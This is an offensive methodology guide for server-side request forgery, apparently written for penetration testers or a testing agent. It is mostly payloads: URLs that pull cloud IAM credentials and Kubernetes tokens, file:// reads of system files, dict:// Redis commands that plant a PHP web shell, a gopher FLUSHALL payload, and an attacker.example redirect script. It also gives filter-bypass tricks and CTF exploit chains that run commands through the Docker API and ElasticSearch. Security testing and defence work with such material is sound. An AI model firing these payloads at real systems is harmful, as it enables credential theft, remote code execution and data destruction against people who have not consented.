# Server-Side Request Forgery (SSRF)

## Trigger

Load the SSRF methodology when the application contains any of these input signals:

**Direct URL parameters:** `?url=`, `?fetch=`, `?image=`, `?img=`, `?proxy=`, `?source=`, `?path=`, `?file=` (if it supports `http://`), `?callback=`, `?webhook=`, `?next=`, `?redirect=`, `?continue=`, `?return=`, `?feed=`

**Feature-level triggers:**
- Avatar / remote image import from URL
- URL preview in chat or comments
- Webhook callback testing / configuration
- RSS / Atom feed fetching
- Remote PDF / Excel / video import and processing
- OAuth redirect URIs / SAML ACS endpoints
- Server-side image processing (ImageMagick)
- PDF generation (wkhtmltopdf, WeasyPrint, Puppeteer)
- Email preview with Open Graph fetch
- SSO metadata / assertion consumer URL import

**Host header injection triggers:** `Host`, `X-Forwarded-Host`, `X-Forwarded-For`, `X-Forwarded-Proto`, `X-Forwarded-Port`, `X-Real-IP`, `X-Original-URL`, `X-Rewrite-URL`, `True-Client-IP`, `Forwarded: for=...; host=...`

---

## Attack Surface

Target characteristics that indicate SSRF value or exploitability:

- **The application makes outbound HTTP requests** from user-supplied URLs
- **Cloud-hosted targets** (AWS, GCP, Azure, Alibaba, Tencent) with metadata endpoints at `169.254.169.254` or `metadata.google.internal`
- **Internal services on loopback** -- Redis (6379), ElasticSearch (9200), MySQL (3306), Memcached (11211), Docker daemon (2375), Consul (8500)
- **URL validation appears but is weak** -- regex-based allowlists, IP blacklist without encoding coverage, scheme restrictions without protocol-switching via redirects
- **Non-HTTP schemes** accepted or reachable through redirect chains (file://, gopher://, dict://, ftp://, ldap://)
- **Response differences** between internal and external targets reveal port state
- **Caching layer present** (Varnish, Cloudflare, Fastly) -- cache poisoning via unkeyed headers may amplify SSRF

---

## Decision Tree

1. **Confirm outbound request capability**
   - Set up an OOB listener (Burp Collaborator, interactsh, or a VPS)
   - Send `url=http://your-oob-domain/ssrf-test` to the parameter
   - If the OOB platform receives a hit, SSRF is confirmed at the basic level

2. **Determine protocol support**
   - Test `file:///etc/passwd` -- if response contains file content, protocol whitelist is absent
   - Test `dict://127.0.0.1:6379/info` -- if Redis info is returned, dict protocol works
   - Test `gopher://127.0.0.1:6379/_` with a Redis PING payload -- full TCP access

3. **Map internal services**
   - Increment ports on `http://127.0.0.1:{PORT}` through SSRF
   - Detect open ports by response timing, content length, or error message differences
   - Key ports: 22 (SSH), 80/443 (HTTP), 3306 (MySQL), 6379 (Redis), 9200 (ElasticSearch), 11211 (Memcached), 2375 (Docker), 8500 (Consul)

4. **Escalate to cloud metadata**
   - If on AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}`
   - If on GCP: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` (requires `Metadata-Flavor: Google` header)
   - If on Azure: `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` (requires `Metadata: true` header)

5. **Exploit via protocol smuggling or redirect chains**
   - If HTTP-only, host a redirect on an attacker domain: `Location: http://127.0.0.1:6379/`
   - If IMDSv2 blocks v1, try PUT-token flow or DNS rebinding to bypass

---

## Techniques

### SSRF Detection Probes

```bash
# Basic loopback probes
url=http://127.0.0.1
url=http://localhost
url=http://[::1]

# OOB detection
url=http://your-oob-domain.com/probe
url=http://[your-oob-domain.com]
```

### IP Address Encoding Bypasses

```text
# Decimal:      2130706433          = 127.0.0.1
# Octal:        017700000001        = 127.0.0.1
# Hex:          0x7f000001          = 127.0.0.1
# Shorthand:    127.1               = 127.0.0.1
# IPv6:         [::1]               = loopback
# IPv4-mapped:  [::ffff:127.0.0.1]  = loopback
# Mixed:        0x7f.0.0.1
# Octal dotted: 0177.0.0.1
# Zero-padded:  127.000.000.001
```

### Cloud Metadata Endpoints

```bash
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}
http://169.254.169.254/latest/user-data

# AWS IMDSv2 (requires PUT + token)
# Step 1: PUT http://169.254.169.254/latest/api/token
#   Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
# Step 2: GET ... with Header: X-aws-ec2-metadata-token: {TOKEN}
# Note: IMDSv2 is effective mitigation since most SSRF cannot send PUT requests

# GCP (requires Metadata-Flavor: Google header)
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env

# Azure (requires Metadata: true header)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Kubernetes
http://kubernetes.default.svc/api/v1/namespaces/default/pods
```

### Protocol-Based Exploitation

```bash
# File protocol - local file read
file:///etc/passwd
file:///proc/self/environ
file:///var/run/secrets/kubernetes.io/serviceaccount/token

# Dict protocol - service probing
dict://127.0.0.1:6379/info          # Redis info
dict://127.0.0.1:11211/stats        # Memcached stats
dict://127.0.0.1:6379/set shell "<?php system($_GET['c']);?>"
dict://127.0.0.1:6379/config set dir /var/www/html
dict://127.0.0.1:6379/config set dbfilename shell.php
dict://127.0.0.1:6379/save

# Gopher protocol - raw TCP to any service
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...
# Gopher format: gopher://<host>:<port>/_<URL-encoded raw TCP payload>

# Gopher to MySQL (capture auth + query packets from tcpdump)
gopher://127.0.0.1:3306/_<MySQL protocol bytes>

# Gopher to HTTP (craft raw HTTP request)
gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0a
```

### DNS Rebinding

```bash
# Public DNS rebinding services
http://7f000001.c0a80101.rbndr.us          # Alternates 127.0.0.1 and 192.168.1.1
http://lock.cmpxchg8b.com/rebinder.html?1  # Custom rebinding configurator
http://7f000001.cip.cc                     # Resolves to 127.0.0.1

# DNS rebinding TOCTOU attack pattern:
# 1st DNS query: returns public IP (passes allowlist check)
# 2nd DNS query: returns internal IP (actual target reached)
# Requires TTL=0 or round-robin A records alternating between IPs
```

### Redirect Chain Bypass

```php
<?php
// Host on attacker-controlled domain as redir.php
header("Location: http://127.0.0.1:6379/");  // redirect to Redis
// header("Location: gopher://127.0.0.1:6379/_...");  // protocol smuggling
// header("Location: file:///etc/passwd");  // local file read
exit;
```

```bash
# Chain redirects to switch protocols:
# https only allowed -> attacker domain (https) -> http -> gopher/dict/file
POST /fetch HTTP/1.1
url=http://attacker.example/redir.php
```

### URL Parsing Discrepancy Bypasses

```bash
# parse_url vs curl discrepancy (33C3 CTF 2016)
# parse_url sees the last @ as the userinfo delimiter
# curl connects to the first @ hostname
url=http://x:x@127.0.0.1:80@allowed.domain/secret/flag
# parse_url -> host=allowed.domain (passes whitelist)
# curl -> connects to 127.0.0.1:80 (SSRF achieved)

# Single @ bypass (EKOPARTY 2016)
url=http://127.0.0.1@allowed.domain/
# parse_url -> host=allowed.domain
# wget/curl -> connects to 127.0.0.1

# @ / backslash variants
url=http://127.0.0.1#@127.0.0.1/
url=http://127.0.0.1\@127.0.0.1/
url=http://127.0.0.1&@127.0.0.1
```

### Docker API SSRF (H7CTF 2025)

```bash
# Discover Docker API on port 2375
curl "http://target/validate?url=http://localhost:2375/version"
curl "http://target/validate?url=http://localhost:2375/containers/json"

# Extract files from container filesystem (tar format)
curl "http://target/validate?url=http://localhost:2375/v1.51/containers/<id>/archive?path=/flag.txt"

# Execute commands via GET-only proxy relay
# Step 1: Create exec instance
curl "http://target/validate?url=http://localhost:8090/request?method=post&data={\"AttachStdout\":true,\"Cmd\":[\"cat\",\"/flag.txt\"]}&url=http://localhost:2375/v1.51/containers/<id>/exec"
# Step 2: Start exec instance
curl "http://target/validate?url=http://localhost:8090/request?method=post&data={\"Detach\":false,\"Tty\":false}&url=http://localhost:2375/v1.51/exec/<exec_id>/start"
```

### WeasyPrint SSRF (CVE-2024-28184)

```html
<!-- Host this HTML and submit URL to WeasyPrint converter -->
<link rel="attachment" href="file:///flag.txt">
<!-- or -->
<a rel="attachment" href="http://127.0.0.1:8080/internal">

<!-- Extract: pdfdetach -save 1 -o flag.txt output.pdf -->
```

### ElasticSearch Groovy SSRF (VolgaCTF 2017)

```bash
# Direct SSRF to ES port 9200 with script_fields
url=http://localhost:9200/_search
# POST body with Groovy script:
{
  "script_fields": {
    "exec": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
    }
  }
}
```

### wget CRLF Injection to SMTP (SECCON 2017)

```python
import urllib.parse

# wget < 1.17.1 does not sanitize CRLF in Host header
smtp_commands = "\r\n".join([
    "HELO x",
    "MAIL FROM:<attacker@x.com>",
    "RCPT TO:<root>",
    "DATA",
    "Subject: flag",
    "",
    "Please send the flag",
    ".",
])
encoded = urllib.parse.quote(smtp_commands, safe='')
# Port must be at the END to avoid "Bad port number"
ssrf_url = f"http://127.0.0.1{encoded}:25/"
```

### SNI-Based FTP Protocol Smuggling (PlaidCTF 2018)

```text
# Craft a hostname whose TLS SNI bytes encode valid FTP commands
# Browser -> HTTPS -> TLS ClientHello (SNI contains "IP 240.1.2.3\n")
# FTP server's line parser sees SNI bytes as IP command
http://ip8.8.8.8.aaaaaa...aaa.127.0.0.1.xip.io:1212/
```

---

## Bypass

| Filter Type | Bypass Technique |
|---|---|
| `127.0.0.1` blocked | Decimal `2130706433`, octal `017700000001`, hex `0x7f000001`, shorthand `127.1`, zero-padded `127.000.000.001` |
| `localhost` blocked | `127.1`, `0.0.0.0`, `[::1]`, `localtest.me` (resolves to 127.0.0.1) |
| Private IP blocked | DNS rebinding with alternating A records |
| HTTP-only scheme | Protocol smuggling via 302 redirect chain (HTTP -> gopher/dict/file) |
| Domain whitelist | `127.0.0.1#@whitelisted.domain`, `@` userinfo bypass, subdomain tricks |
| Port blacklist | Use gopher to talk to services on any port, or redirect chain to non-standard ports |
| IMDSv2 | DNS rebinding, try IMDSv1, use gopher to craft raw HTTP with token header |
| Regex allowlist (unescaped dot) | Register domain matching skeleton: `meepwntubex0x1337.space` matches `/meepwntube.0x1337.space$/` |
| Multi-`@` blocked | Double-`@` parse_url vs curl discrepancy |
| URL validation only | Redirect chain bypass -- validate one URL, follow redirect to another |
| Gopher no-host | `gopher:///127.0.0.1:1433/_` (empty host in some parsers bypasses scheme check) |
| Unkeyed header blocking | HTTP request smuggling, CRLF injection, duplicate headers |

---

## Verification

1. **Out-of-band (OOB) confirmation:** Deploy an OOB listener. The SSRF parameter receives a callback. Check the User-Agent to identify the HTTP client library (wkhtmltopdf, Go-http-client, Java, python-requests).

2. **File read confirmation:** `file:///etc/passwd` returns file content or error message with partial content.

3. **Port scan oracle:** Two SSRF requests to `127.0.0.1:22` and `127.0.0.1:22222`. Different response times or content lengths indicate open vs closed ports.

4. **Cloud metadata presence:** `http://169.254.169.254/latest/meta-data/` returns JSON, HTML directory listing, or an IAM role name.

5. **Attachment oracle (WeasyPrint):** An `<a rel="attachment" href="...">` tag only embeds the file in the PDF when the target returns HTTP 200. Varying response codes or content creates a boolean oracle.

6. **Blind confirmation:** Use `sleep` or time-based side channel if response is hidden. For example, SSRF to `http://127.0.0.1:6379/` with Redis `CONFIG SET` timeout commands.

---

## Pitfalls

- **IMDSv2 blocks v1 on modern AWS.** Do not assume v1 works. If `latest/meta-data/` returns empty or a `401`, the instance uses v2. You need PUT + token, which most SSRF cannot achieve. Try DNS rebinding or gopher-based raw HTTP to bypass.
- **Gopher requires double URL encoding** when the SSRF handler URL-decodes once before passing to the transport layer.
- **Dict protocol cannot send binary data.** Use gopher for raw binary protocols. Dict only works for text-based commands.
- **302 redirect chains can switch protocols.** An initial `https://` check can be bypassed by hosting a redirect that points to `gopher://` or `file://`.
- **Docker API SSRF with GET-only** requires finding an internal proxy/relay endpoint that can forward POST requests.
- **ElasticSearch Groovy scripting disabled by default** in versions >= 5.0. Pre-5.0 only.
- **wget CRLF injection** only works on wget < 1.17.1 (notably CentOS 7 default wget 1.14).
- **WeasyPrint attachment links** only embed on 200 OK responses -- use as boolean oracle, not direct read if the target URL returns non-200.
- **Do not execute destructive commands** (Redis FLUSHALL, SSH key overwrite, IAM token use) during verification. Prove reachability, not full compromise.
